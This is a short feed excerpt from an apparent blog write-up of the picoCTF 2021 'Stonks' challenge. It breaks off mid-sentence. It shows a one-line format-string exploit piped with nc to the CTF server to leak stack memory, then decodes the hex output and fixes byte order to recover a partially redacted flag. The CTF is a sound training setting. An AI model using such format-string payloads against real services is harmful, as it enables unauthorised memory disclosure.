channel.title: cyber-chef on Poney Island
channel.description: Recent content in cyber-chef on Poney Island

item.title: picoCTF 2021 - Binary Exploitation
item.description: Stonks There is a format-string vulnerability. (echo 1; for i in {1..50}; do echo -n "%${i}\$08x" ; done ; echo) | nc mercury.picoctf.net 6989 There is some ASCII characters in the output, so we can convert from hex the output to read the string We find the string but we have the wrong Endianness ocip{FTC0l_I4_t5m[..SNIP..]..} With Cyberchef it is easy, simply click here to view the solution. in python3, it is more tricky:
